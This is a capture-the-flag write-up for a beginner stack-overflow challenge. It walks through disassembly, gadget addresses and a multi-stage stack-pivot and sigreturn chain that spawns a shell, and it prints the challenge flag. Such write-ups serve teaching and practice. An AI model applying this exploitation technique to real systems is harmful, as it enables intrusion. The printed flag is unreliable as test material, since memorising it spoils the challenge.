# pset1

- Category: pwn
- Difficulty: beginner
- Author: hoover

"I just started the CS50 course... I gave myself plenty of room for my name, or at least, I think I did."

Same shape as [No win](../no-win/) — static, non-PIE, no canary in `main`, no `pop rdi`/`pop rsi` anywhere — but the read is only 0x100 bytes, which is too small for a sigreturn frame. The way out is that `main` can be re-entered as an arbitrary-write gadget.

### Solution:

##### 1. The overflow, and why SROP does not fit

```asm
401b76:  mov    rbp,rsp
401b79:  sub    rsp,0x40           ; buf at rbp-0x40
401bc3:  lea    rax,[rbp-0x40]
401bc7:  mov    edx,0x100          ; only 256 bytes this time
401bcf:  mov    edi,0x0
401bd4:  call   421830 <__libc_read>
401bd9:  lea    rax,[rbp-0x40]
401be0:  mov    edi,0x480032       ; printf("hello, %s", buf)
401bea:  call   405050 <_IO_printf>
401bf4:  leave
401bf5:  ret
```

Return address at offset 72 again, and the same gadget vacuum — this binary has no `pop rdx` either, only `pop rax; ret` (`0x42986b`) and `syscall; ret` (`0x411ac6`). So SROP is again the only route, but `72 + 24 + 304 = 400` bytes of setup do not fit in a 256-byte read.

##### 2. `main` re-entered is an arbitrary write

Returning to `0x401bc3` instead of to `main`'s entry skips the prologue, so `rbp` is whatever we put in the saved-`rbp` slot. That turns the tail of `main` into a reusable primitive:

```
read(0, rbp-0x40, 0x100)      ; write 256 bytes wherever we choose
printf("hello, %s", rbp-0x40)
leave ; ret                   ; rsp = rbp; rbp = [rbp]; rip = [rbp+8]
```

Every pass writes 256 bytes to an address of our choosing **and** hands back a fresh `(rbp, rip)` pair read out of the bytes just written — at offsets `0x40` and `0x48` of the chunk. So two passes can lay a 304-byte frame out contiguously in `.bss`, and a third `leave; ret` pivots `rsp` onto it.

##### 3. Laying the frame out so it dodges its own control fields

Each chunk burns bytes `0x40..0x50` for its control pair, so the frame has to be positioned where those two qwords land on fields the kernel does not care about. Putting the frame at `C+0x18` works out exactly:

| bytes | role in the chunk | role in the frame |
|---|---|---|
| `C+0x40`, `C+0x48` | chunk A's `(rbp, rip)` → drives read #3 | frame offsets 40, 48 = `r8`, `r9` (unused by `execve`) |
| `C+0x140`, `C+0x148` | chunk B's `(rbp, rip)` → pivot | frame offsets 296, 304 = inside `uc_sigmask` |

Chunk A is written second-to-last and chunk B last, so the final pivot pair is intact when it is used. The chain is then:

```
p1      : 64 pad + rbp=C+0x40 + rip=0x401bc3      -> read #2 writes chunk A at C
chunk A : [C+0x00]=pop rax  [C+0x08]=15  [C+0x10]=syscall  [C+0x18]=sigframe
          [C+0x40]=C+0x140  [C+0x48]=0x401bc3     -> read #3 writes chunk B at C+0x100
chunk B : [C+0x140]=C-8     [C+0x148]=leave;ret   -> rsp=C-8; pop rbp; ret -> [C]
```

`leave; ret` with `rbp = C-8` lands `rip` on `[C]` with `rsp = C+8`, so `pop rax` takes 15, `ret` takes the syscall gadget, and `rsp` arrives at `C+0x18` — the frame — exactly as the `syscall` executes.

##### 4. busybox wants an argv

Locally this popped a shell immediately. The remote answered `applet not found`, because the container's `/bin/sh` is busybox, which picks its applet from `argv[0]` — and `execve(path, NULL, NULL)` gives it nothing to read. Pointing `rsi` at a real `["/bin/sh", NULL]` array placed in chunk B fixed it:

```
hello,
hello, k?B
hello,
NNS{BUFf3r_4nD_m3M0rY_15_h4Rd_Wh3n_oveRF10ws_eXis7}
```

(three `hello,` lines = the three reads, then the shell).

Full script: [solve.py](solve.py)

**Flag:** `NNS{BUFf3r_4nD_m3M0rY_15_h4Rd_Wh3n_oveRF10ws_eXis7}`

### Takeaways

- A function that reads into `rbp-offset` and ends in `leave; ret` is an arbitrary-write loop as soon as you control the saved `rbp` — re-enter it *after* the prologue and each pass gives you both a write and the next `(rbp, rip)`. That beats hunting for a pivot gadget when the payload will not fit in one read.
- When staging a sigframe through a primitive that reserves fixed offsets, check those offsets against the frame layout rather than moving the frame blindly: `r8`–`r15` and everything past `fpstate` (224) are free, while `cs`/`ss`/`rip`/`rsp` and a zero `fpstate` are not.
- `execve(path, NULL, NULL)` is fine against a real shell and fails against busybox, which needs `argv[0]`. `applet not found` is the tell that the target is BusyBox rather than that the exploit is broken.
